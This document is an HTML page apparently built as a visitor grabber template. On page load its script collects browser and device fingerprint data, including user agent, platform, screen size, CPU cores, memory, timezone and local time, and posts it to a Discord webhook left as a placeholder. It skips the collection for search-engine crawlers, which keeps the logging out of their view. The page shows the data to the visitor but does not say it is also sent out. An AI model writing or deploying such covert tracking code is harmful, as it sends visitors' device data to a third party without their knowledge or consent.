<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>System Information</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: white;
      color: black;
      padding: 20px;
    }
    pre {
      white-space: pre-wrap;
      word-wrap: break-word;
    }
  </style>
</head>
<body>
  <h1>System Information</h1>
  <pre id="info">Gathering system information...</pre>

  <script>
    // Function to check if the user is a bot
    function isBot() {
      const botUserAgents = [
        "bot", "spider", "crawl", "slurp", "mediapartners-google", 
        "adsbot-google", "feedfetcher-google", "bingbot", "duckduckbot",
        "yandexbot", "baiduspider", "sogou", "exabot", "facebot", "ia_archiver"
      ];
      const userAgent = navigator.userAgent.toLowerCase();
      return botUserAgents.some((bot) => userAgent.includes(bot));
    }

    // Function to send data to Discord webhook
    async function sendToWebhook(data) {
      const webhookUrl = "https://discord.com/api/webhooks/YOUR-WEBHOOK-ID/YOUR-WEBHOOK-TOKEN"; // Replace with your webhook URL
      try {
        await fetch(webhookUrl, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({ content: data }),
        });
      } catch (error) {
        console.error("Failed to send data to webhook:", error);
      }
    }

    // Function to gather and display system information
    async function gatherSystemInfo() {
      if (isBot()) {
        document.getElementById("info").textContent = "Bot traffic detected. System information will not be logged.";
        return;
      }

      // Gather system information
      const screenResolution = `${window.screen.width}x${window.screen.height}`;
      const windowDimensions = `${window.innerWidth}x${window.innerHeight}`;
      const pixelDensity = window.devicePixelRatio;
      const browser = navigator.userAgent;
      const operatingSystem = navigator.platform;
      const cpuCores = navigator.hardwareConcurrency;
      const memory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unavailable";
      const touchscreenSupport = navigator.maxTouchPoints > 0;
      const language = navigator.language;
      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
      const localTime = new Date().toString();

      const message = `
Screen Resolution: ${screenResolution}
Window Dimensions: ${windowDimensions}
Pixel Density: ${pixelDensity}
Browser: ${browser}
Operating System: ${operatingSystem}
CPU Cores: ${cpuCores}
Memory: ${memory}
Touchscreen Support: ${touchscreenSupport}
Language: ${language}
Timezone: ${timezone}
Local Time: ${localTime}
      `;

      // Display the information on the page
      document.getElementById("info").textContent = message;

      // Send the information to the webhook
      sendToWebhook(message);
    }

    // Call the function to gather and display system info
    gatherSystemInfo();
  </script>
</body>
</html>
